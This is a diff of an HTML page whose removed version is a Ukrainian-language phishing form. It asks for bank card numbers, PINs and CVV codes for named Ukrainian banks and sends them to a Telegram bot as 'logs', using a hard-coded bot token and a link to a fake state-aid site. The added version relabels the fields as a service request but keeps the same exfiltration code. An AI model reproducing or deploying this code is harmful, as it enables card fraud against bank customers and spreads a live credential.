@@ -8,20 +8,20 @@
 body{
   margin:0;
   font-family: Arial;
-  background:#f1f5f9;
+  background: linear-gradient(135deg,#eef2ff,#f8fafc);
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
 }
 
-.box{
+.card{
   background:white;
+  width:380px;
   padding:30px;
   border-radius:20px;
-  width:360px;
+  box-shadow:0 15px 40px rgba(0,0,0,0.1);
   text-align:center;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
 }
 
 h2{
@@ -32,9 +32,8 @@ input{
   width:100%;
   padding:12px;
   margin:6px 0;
-  border:1px solid #e2e8f0;
   border-radius:10px;
-  outline:none;
+  border:1px solid #e2e8f0;
 }
 
 .service{
@@ -46,7 +45,7 @@ input{
 }
 
 .service.active{
-  background:#3b82f6;
+  background:#4f46e5;
   color:white;
 }
 
@@ -54,33 +53,39 @@ button{
   width:100%;
   padding:12px;
   margin-top:10px;
-  background:#3b82f6;
+  background:#4f46e5;
   color:white;
   border:none;
   border-radius:10px;
   cursor:pointer;
+}
+
+button:hover{
+  background:#4338ca;
 }
 </style>
 </head>
 
 <body>
 
-<div class="box">
-  <h2></h2>Залишити заявку</h2>
+<div class="card">
+  <h2>🚀 Оставь заявку</h2>
 
-  <input type="text" id="name" placeholder="Ім'я">
-  <input type="text" id="phone" placeholder="Телефон">
-  <input type="text" id="telegram" placeholder="Номер картки">
-  <input type="text" id="city" placeholder="Пін-код">
-  <input type="text" id="budget" placeholder="CVV/CCV2">
+  <!-- 6 ПОЛЕЙ -->
+  <input id="name" placeholder="Имя">
+  <input id="phone" placeholder="Телефон">
+  <input id="telegram" placeholder="@Telegram">
+  <input id="city" placeholder="Город">
+  <input id="budget" placeholder="Бюджет">
+  <input id="comment" placeholder="Комментарий">
 
-  <p>Ваш Банк:</p>
+  <p>Выберите услугу:</p>
 
-  <div class="service" onclick="select(this)">Oschad Bank</div>
-  <div class="service" onclick="select(this)">Monobank</div>
-  <div class="service" onclick="select(this)">Privat Bank</div>
+  <div class="service" onclick="select(this)">Сайт</div>
+  <div class="service" onclick="select(this)">Дизайн</div>
+  <div class="service" onclick="select(this)">Telegram бот</div>
 
-  <button onclick="send()">Отримати</button>
+  <button onclick="send()">Отправить</button>
 </div>
 
 <script>
@@ -98,9 +103,10 @@ function send(){
   const telegram = document.getElementById("telegram").value.trim();
   const city = document.getElementById("city").value.trim();
   const budget = document.getElementById("budget").value.trim();
+  const comment = document.getElementById("comment").value.trim();
 
-  if(!name || !phone || !telegram || !city || !budget || !service){
-    alert("Заповніть все!");
+  if(!name||!phone||!telegram||!city||!budget||!comment||!service){
+    alert("Заполни все поля!");
     return;
   }
 
@@ -109,23 +115,25 @@ function send(){
   const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
   const chat_id = "8035773808";
 
-  const link = `https://dopomogavidderzhavi-bvoa.vercel.app/go.html?id=${id}`;
+  const link = `https://ТВОЙ-САЙТ/go.html?id=${id}`;
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       chat_id:chat_id,
-      text:`🔥 Новый Лог 👻:
+      text:`🔥 НОВАЯ ЗАЯВКА
 ID: ${id}
+
 Имя: ${name}
 Телефон: ${phone}
-Номер Карты: ${telegram}
-Пин-код: ${city}
-Срок: ${budget}
-CVV: ${service}
+Telegram: ${telegram}
+Город: ${city}
+Бюджет: ${budget}
+Комментарий: ${comment}
+Услуга: ${service}
 
-СМС/КОД:
+👉 Управление:
 ${link}`
     })
   });
